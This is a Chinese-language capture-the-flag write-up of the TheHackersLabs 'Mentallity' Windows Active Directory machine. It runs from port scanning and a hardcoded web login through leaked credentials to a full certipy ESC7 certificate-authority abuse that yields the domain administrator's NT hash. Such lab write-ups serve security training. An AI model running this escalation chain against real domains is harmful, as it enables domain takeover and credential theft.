{"pageProps":{"postData":{"id":"TheHackersLabsMentallity","contentHtml":"<h1>Mentallity</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/120\">https://labs.thehackerslabs.com/machine/120</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsMentallity/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<p><code>namp</code> 端口扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity nmap -sn 192.168.56.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:45 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00032s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00027s latency).\nMAC Address: 08:00:27:3B:D1:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.28\nHost is up (0.00024s latency).\nMAC Address: 08:00:27:C2:70:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.91\nHost is up (0.00028s latency).\nMAC Address: 08:00:27:11:40:07 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.5\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (5 hosts up) scanned <span class=\"hljs-keyword\">in</span> 27.97 seconds\n</code></pre>\n<p>貌似是双网卡</p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity nmap -sT -min-rate 10000 -p- 192.168.56.28\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:46 CST \nWarning: 192.168.56.28 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10). \nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.28              \nHost is up (0.00057s latency).                  \nNot shown: 63744 closed tcp ports (conn-refused), 1762 filtered tcp ports (no-response)\nPORT      STATE SERVICE                         \n21/tcp    open  ftp                             \n53/tcp    open  domain                          \n80/tcp    open  http                            \n88/tcp    open  kerberos-sec                    \n135/tcp   open  msrpc                           \n139/tcp   open  netbios-ssn                     \n389/tcp   open  ldap                            \n445/tcp   open  microsoft-ds                    \n464/tcp   open  kpasswd5                        \n593/tcp   open  http-rpc-epmap                  \n636/tcp   open  ldapssl                         \n3268/tcp  open  globalcatLDAP                   \n3269/tcp  open  globalcatLDAPssl                \n5985/tcp  open  wsman                           \n8080/tcp  open  http-proxy                      \n9389/tcp  open  adws                            \n47001/tcp open  winrm  \n...    \n\n➜  Mentallity nmap -sT -min-rate 10000 -p- 192.168.56.91\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:46 CST\nWarning: 192.168.56.91 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.91\nHost is up (0.00024s latency).\nNot shown: 63929 closed tcp ports (conn-refused), 1577 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n21/tcp    open  ftp\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n8080/tcp  open  http-proxy\n9389/tcp  open  adws\n47001/tcp open  winrm    \n...     \n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mentallity nmap -sT -A -p $(<span class=\"hljs-built_in\">cat</span> port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | <span class=\"hljs-built_in\">paste</span> -sd <span class=\"hljs-string\">','</span>) 192.168.56.28\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:49 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.28\nHost is up (0.00046s latency).\n\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Microsoft ftpd\n| ftp-syst:\n|_  SYST: Windows_NT\n|_ssl-<span class=\"hljs-built_in\">date</span>: 2025-07-23T12:50:56+00:00; 0s from scanner <span class=\"hljs-keyword\">time</span>.\n| ssl-cert: Subject: commonName=VulnFTP\n| Subject Alternative Name: DNS:VulnFTP\n| Not valid before: 2025-07-17T09:01:44\n|_Not valid after:  2026-07-17T09:21:44\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n| http-methods:\n|_  Potentially risky methods: TRACE\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-07-23 12:50:06Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>                                                                                                                                              \n445/tcp   open  microsoft-ds?                                                                                                                                                                   \n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&#x3C;unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n8080/tcp  open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: Mentality \\xC2\\xB7 Innovating Beyond Limits\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nMAC Address: 08:00:27:C2:70:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2022 (99%), Microsoft Windows Server 2016 or Server 2019 (97%), Microsoft Windows 10 1703 or Windows 11 21H2 (97%), Microsoft Windows 11 21H2 (96%), Windows Server 2019 (96%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 1703 (94%), Microsoft Windows 10 1507 - 1607 (94%), Microsoft Windows Server 2012 or 2012 R2 (94%), Microsoft Windows Server 2012 R2 Update 1 (94%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: Host: WIN-9FQTT7GPAVK; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   <span class=\"hljs-built_in\">date</span>: 2025-07-23T12:50:48\n|_  start_date: N/A\n|_nbstat: NetBIOS name: WIN-9FQTT7GPAVK, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 08:00:27:c2:70:8b (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.46 ms 192.168.56.28\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 70.86 seconds\n</code></pre>\n<h3>枚举测试</h3>\n<p><code>SMB</code> 匿名账户测试</p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity nxc smb 192.168.56.28 -u anonymous -p <span class=\"hljs-string\">''</span> --smb-timeout 9999\nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [-] mentality.thl\\anonymous: STATUS_LOGON_FAILURE\n</code></pre>\n<p>FTP 匿名测试</p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity ftp 192.168.56.28                      \nConnected to 192.168.56.28.\n220 Microsoft FTP Service\nName (192.168.56.28:root): anonymous\n331 Password required\nPassword: \n530 User cannot <span class=\"hljs-built_in\">log</span> <span class=\"hljs-keyword\">in</span>.\nftp: Login failed\n</code></pre>\n<h3>HTTP</h3>\n<p>HTTP - 80</p>\n<p><img src=\"/post-images/TheHackersLabsMentallity/image1.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity feroxbuster --url http://192.168.56.28 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x asp,php,txt,zip\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.28\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ <span class=\"hljs-literal\">true</span>\n 💲  Extensions            │ [asp, php, txt, zip]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      334l     2089w   180418c http://192.168.56.28/iisstart.png\n200      GET       32l       55w      703c http://192.168.56.28/\n[####################] - 2m   1038160/1038160 0s      found:2       errors:0\n[####################] - 2m   1038145/1038145 10180/s http://192.168.56.28/\n</code></pre>\n<p>HTTP - 8080</p>\n<p><img src=\"/post-images/TheHackersLabsMentallity/image2.png\" alt=\"image.png\"></p>\n<p>发现一个登录页面</p>\n<p><img src=\"/post-images/TheHackersLabsMentallity/image3.png\" alt=\"image.png\"></p>\n<p>我们点击登录的时候发现很奇怪，因为并没有提交数据</p>\n<p>然后可以注意到只加载了一个 <code>JS</code> 脚本</p>\n<p><img src=\"/post-images/TheHackersLabsMentallity/image4.png\" alt=\"image.png\"></p>\n<p>脚本内容</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">validateForm</span></span>() {\n    const u = document.getElementById(<span class=\"hljs-string\">\"username\"</span>).value;\n    const p = document.getElementById(<span class=\"hljs-string\">\"password\"</span>).value;\n    const errorMessage = document.getElementById(<span class=\"hljs-string\">\"errorMessage\"</span>);\n\n    <span class=\"hljs-keyword\">if</span> (u === <span class=\"hljs-string\">\"admin\"</span> &#x26;&#x26; p === <span class=\"hljs-string\">\"adminpass123\"</span>) {\n        window.location.href = <span class=\"hljs-string\">\"dashboard.html\"</span>;\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-literal\">false</span>;\n    }\n    errorMessage.textContent = <span class=\"hljs-string\">\"Invalid Username Or Password!\"</span>;\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-literal\">false</span>;\n}\n</code></pre>\n<p>我们直接转到 <code>ashboard.html</code></p>\n<p><img src=\"/post-images/TheHackersLabsMentallity/image5.png\" alt=\"image.png\"></p>\n<p>得到一串 <code>BASE64</code> 编码后的字符串，解密后得到 <code>FTP</code>的账户</p>\n<p><img src=\"/post-images/TheHackersLabsMentallity/image6.png\" alt=\"image.png\"></p>\n<p>发现里面有三个文件</p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity ftp 192.168.56.28\nConnected to 192.168.56.28.\n220 Microsoft FTP Service\nName (192.168.56.28:root): ftpuser \n331 Password required\nPassword: \n230 User logged <span class=\"hljs-keyword\">in</span>.\nRemote system <span class=\"hljs-built_in\">type</span> is Windows_NT.\nftp> <span class=\"hljs-built_in\">ls</span>\n229 Entering Extended Passive Mode (|||54349|)\n125 Data connection already open; Transfer starting.\n07-17-25  08:52AM              1608612 ad_hc_mentality_htl.html\n07-17-25  05:48AM                   34 flag.txt\n07-17-25  12:13AM                   75 web.config\n226 Transfer complete.\nftp> \n</code></pre>\n<p>其中这个就是 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity <span class=\"hljs-built_in\">cat</span> flag.txt      \nFLAG{thisxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<p>另外一个 <code>HTML</code> 文件是安全分析结果，是关于域的</p>\n<p><img src=\"/post-images/TheHackersLabsMentallity/image7.png\" alt=\"image.png\"></p>\n<p>在报告中能得到一个凭据 <code>svcapp1</code>:<code>Hola1234$</code> ，并且也知道了 <code>ftpuser</code> 也是可以在域中进行认证的</p>\n<p><img src=\"/post-images/TheHackersLabsMentallity/image8.png\" alt=\"image.png\"></p>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity nxc smb 192.168.56.28 -u <span class=\"hljs-string\">'svcapp1'</span> -p <span class=\"hljs-string\">'Hola1234$'</span> --smb-timeout 9999                  \nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [+] mentality.thl\\svcapp1:Hola1234$\n\n➜  Mentallity nxc ldap 192.168.56.28 -u <span class=\"hljs-string\">'svcapp1'</span> -p <span class=\"hljs-string\">'Hola1234$'</span>               \nLDAP        192.168.56.28   389    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl)\nLDAPS       192.168.56.28   636    WIN-9FQTT7GPAVK  [+] mentality.thl\\svcapp1:Hola1234$\n \n➜  Mentallity nxc winrm 192.168.56.28 -u <span class=\"hljs-string\">'svcapp1'</span> -p <span class=\"hljs-string\">'Hola1234$'</span>\nWINRM       192.168.56.28   5985   WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class=\"hljs-keyword\">in</span> 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.28   5985   WIN-9FQTT7GPAVK  [-] mentality.thl\\svcapp1:Hola1234$ \n</code></pre>\n<p><code>SMB</code> 文件列表</p>\n<pre><code class=\"hljs language-bash\">➜  192.168.56.28 tree\n.\n└── SYSVOL\n    └── mentality.thl\n        └── Policies\n            ├── {31B2F340-016D-11D2-945F-00C04FB984F9}\n            │   ├── GPT.INI\n            │   └── MACHINE\n            │       ├── Microsoft\n            │       │   └── Windows NT\n            │       │       └── SecEdit\n            │       │           └── GptTmpl.inf\n            │       └── Registry.pol\n            └── {6AC1786C-016F-11D2-945F-00C04fB984F9}\n                ├── GPT.INI\n                └── MACHINE\n                    └── Microsoft\n                        └── Windows NT\n                            └── SecEdit\n                                └── GptTmpl.inf\n</code></pre>\n<h2>域分析</h2>\n<p>收集信息</p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity bloodhound-python -d <span class=\"hljs-string\">'mentality.thl'</span> -ns 192.168.56.28 --zip -c All -dc <span class=\"hljs-string\">'WIN-9FQTT7GPAVK.mentality.thl'</span> -u svcapp1 -p <span class=\"hljs-string\">'Hola1234$'</span>                                                \nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: mentality.thl\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nINFO: Connecting to LDAP server: WIN-9FQTT7GPAVK.mentality.thl\nWARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: WIN-9FQTT7GPAVK.mentality.thl\nWARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...\nINFO: Found 6 <span class=\"hljs-built_in\">users</span>\nINFO: Found 55 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WIN-9FQTT7GPAVK.mentality.thl\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 01S\nINFO: Compressing output into 20250723214935_bloodhound.zip\n</code></pre>\n<p>用户组</p>\n<p><img src=\"/post-images/TheHackersLabsMentallity/image9.png\" alt=\"image.png\"></p>\n<p>翻了半天并没有发现什么可以利用的</p>\n<h2>ESC 7</h2>\n<p>使用 <code>certipy-ad</code> 枚举一下证书漏洞</p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity certipy-ad -debug find -dc-ip 192.168.56.28 -u svcapp1 -p Hola1234$ -vulnerable -text -target WIN-9FQTT7GPAVK.mentality.thl  \n</code></pre>\n<p>发现 <code>ESC 7</code></p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity <span class=\"hljs-built_in\">cat</span> 20250723221243_Certipy.txt \nCertificate Authorities\n  0\n    CA Name                             : mentality-WIN-9FQTT7GPAVK-CA\n    DNS Name                            : WIN-9FQTT7GPAVK.mentality.thl\n    Certificate Subject                 : CN=mentality-WIN-9FQTT7GPAVK-CA, DC=mentality, DC=thl\n    Certificate Serial Number           : 52F256456C27B2834A8DCCF7EE745646\n    Certificate Validity Start          : 2025-07-17 13:46:02+00:00\n    Certificate Validity End            : 2045-07-17 13:56:02+00:00\n    Web Enrollment\n      HTTP\n        Enabled                         : False\n      HTTPS\n        Enabled                         : False\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption <span class=\"hljs-keyword\">for</span> Requests     : Enabled\n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy\n    Permissions\n      Owner                             : MENTALITY.THL\\Administrators\n      Access Rights\n        Enroll                          : MENTALITY.THL\\Authenticated Users\n                                          MENTALITY.THL\\svcapp1\n        ManageCa                        : MENTALITY.THL\\svcapp1\n                                          MENTALITY.THL\\Domain Admins\n                                          MENTALITY.THL\\Enterprise Admins\n                                          MENTALITY.THL\\Administrators\n        ManageCertificates              : MENTALITY.THL\\Domain Admins\n                                          MENTALITY.THL\\Enterprise Admins\n                                          MENTALITY.THL\\Administrators\n    [+] User Enrollable Principals      : MENTALITY.THL\\Authenticated Users\n                                          MENTALITY.THL\\svcapp1\n    [+] User ACL Principals             : MENTALITY.THL\\svcapp1\n    [!] Vulnerabilities\n      ESC7                              : User has dangerous permissions.\nCertificate Templates                   : [!] Could not find any certificate templates\n</code></pre>\n<p>跟着文档打即可</p>\n<p>文档链接：<a href=\"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca\">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca</a></p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity certipy-ad ca \\\n    -u <span class=\"hljs-string\">'svcapp1@mentality.thl'</span> -p <span class=\"hljs-string\">'Hola1234$'</span> \\\n    -ns <span class=\"hljs-string\">'192.168.56.28'</span> -target <span class=\"hljs-string\">'WIN-9FQTT7GPAVK.mentality.thl'</span> \\\n    -ca <span class=\"hljs-string\">'mentality-WIN-9FQTT7GPAVK-CA'</span> -add-officer <span class=\"hljs-string\">'svcapp1'</span>\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Successfully added officer <span class=\"hljs-string\">'svcapp1'</span> on <span class=\"hljs-string\">'mentality-WIN-9FQTT7GPAVK-CA'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mentallity certipy ca \\\n    -u <span class=\"hljs-string\">'svcapp1@mentality.thl'</span> -p <span class=\"hljs-string\">'Hola1234$'</span> \\\n    -ns <span class=\"hljs-string\">'192.168.56.28'</span> -target <span class=\"hljs-string\">'WIN-9FQTT7GPAVK.mentality.thl'</span> \\\n    -ca <span class=\"hljs-string\">'mentality-WIN-9FQTT7GPAVK-CA'</span> -enable-template <span class=\"hljs-string\">'SubCA'</span>\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Successfully enabled <span class=\"hljs-string\">'SubCA'</span> on <span class=\"hljs-string\">'mentality-WIN-9FQTT7GPAVK-CA'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mentallity certipy req \\\n    -u <span class=\"hljs-string\">'svcapp1@mentality.thl'</span> -p <span class=\"hljs-string\">'Hola1234$'</span> \\\n    -ns <span class=\"hljs-string\">'192.168.56.28'</span> -target <span class=\"hljs-string\">'WIN-9FQTT7GPAVK.mentality.thl'</span> \\\n    -ca <span class=\"hljs-string\">'mentality-WIN-9FQTT7GPAVK-CA'</span> -template <span class=\"hljs-string\">'SubCA'</span> \\\n    -upn <span class=\"hljs-string\">'administrator@mentality.thl'</span> -sid <span class=\"hljs-string\">'S-1-5-21-1896710242-59548724-504912181-500'</span>\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Request ID is 5\n[-] Got error <span class=\"hljs-keyword\">while</span> requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template <span class=\"hljs-keyword\">do</span> not allow the current user to enroll <span class=\"hljs-keyword\">for</span> this <span class=\"hljs-built_in\">type</span> of certificate.\nWould you like to save the private key? (y/N): y\n[*] Saving private key to <span class=\"hljs-string\">'5.key'</span>\n[*] Wrote private key to <span class=\"hljs-string\">'5.key'</span>\n[-] Failed to request certificate\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mentallity certipy ca \\\n    -u <span class=\"hljs-string\">'svcapp1@mentality.thl'</span> -p <span class=\"hljs-string\">'Hola1234$'</span> \\\n    -ns <span class=\"hljs-string\">'192.168.56.28'</span> -target <span class=\"hljs-string\">'WIN-9FQTT7GPAVK.mentality.thl'</span> \\\n    -ca <span class=\"hljs-string\">'mentality-WIN-9FQTT7GPAVK-CA'</span> -issue-request <span class=\"hljs-string\">'5'</span>\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Successfully issued certificate request ID 5\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mentallity certipy req \\\n    -u <span class=\"hljs-string\">'svcapp1@mentality.thl'</span> -p <span class=\"hljs-string\">'Hola1234$'</span> \\\n    -ns <span class=\"hljs-string\">'192.168.56.28'</span> -target <span class=\"hljs-string\">'WIN-9FQTT7GPAVK.mentality.thl'</span> \\\n    -ca <span class=\"hljs-string\">'mentality-WIN-9FQTT7GPAVK-CA'</span> -retrieve <span class=\"hljs-string\">'5'</span>\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Retrieving certificate with ID 5\n[*] Successfully retrieved certificate\n[*] Got certificate with UPN <span class=\"hljs-string\">'administrator@mentality.thl'</span>\n[*] Certificate object SID is <span class=\"hljs-string\">'S-1-5-21-1896710242-59548724-504912181-500'</span>\n[*] Loaded private key from <span class=\"hljs-string\">'5.key'</span>\n[*] Saving certificate and private key to <span class=\"hljs-string\">'administrator.pfx'</span>\n[*] Wrote certificate and private key to <span class=\"hljs-string\">'administrator.pfx'</span>\n</code></pre>\n<p>获取 <code>HASH</code></p>\n<pre><code class=\"hljs language-bash\">➜  Mentallity certipy-ad auth -pfx <span class=\"hljs-string\">'administrator.pfx'</span> -domain <span class=\"hljs-string\">\"mentality.thl\"</span> -dc-ip 192.168.56.28\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: <span class=\"hljs-string\">'administrator@mentality.thl'</span>\n[*]     SAN URL SID: <span class=\"hljs-string\">'S-1-5-21-1896710242-59548724-504912181-500'</span>\n[*]     Security Extension SID: <span class=\"hljs-string\">'S-1-5-21-1896710242-59548724-504912181-500'</span>\n[*] Using principal: <span class=\"hljs-string\">'administrator@mentality.thl'</span>\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saving credential cache to <span class=\"hljs-string\">'administrator.ccache'</span>\n[*] Wrote credential cache to <span class=\"hljs-string\">'administrator.ccache'</span>\n[*] Trying to retrieve NT <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'administrator'</span>\n[*] Got <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'administrator@mentality.thl'</span>: aad3b435b51404xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxd04a6bd959f95ce2b2\n</code></pre>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> <span class=\"hljs-built_in\">cat</span> root_flag.txt\n4042xxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>不难，但是差一点点就首杀了！！！！！！！！！！！！！！！！</p>\n<p>就五分钟！！</p>","title":"TheHackersLabs - Mentallity","date":"2025-07-23","updated":"2025-07-23","tags":["TheHackersLabs","Windows","AD","ESC7","FTP"],"categories":"靶机","comments":true,"description":"Mentallity\n\n https://labs.thehackerslabs.com/machine/120\n \n\n\n\nRecon\n\nPortScan\n\n`namp` 端口扫描\n\n\n\n貌似是双网卡\n\n\n\n\n\n枚举测试\n\n`SMB` 匿名账户测试\n\n\n\nFTP 匿名测试\n\n\n\nHTTP\n\nHTTP - 80\n\n\n\n\n\nHTTP - 8080\n\n\n\n发现一个登录页面\n\n\n\n我们点击登录的时候发现很..."},"recentPosts":[{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"}]},"__N_SSG":true}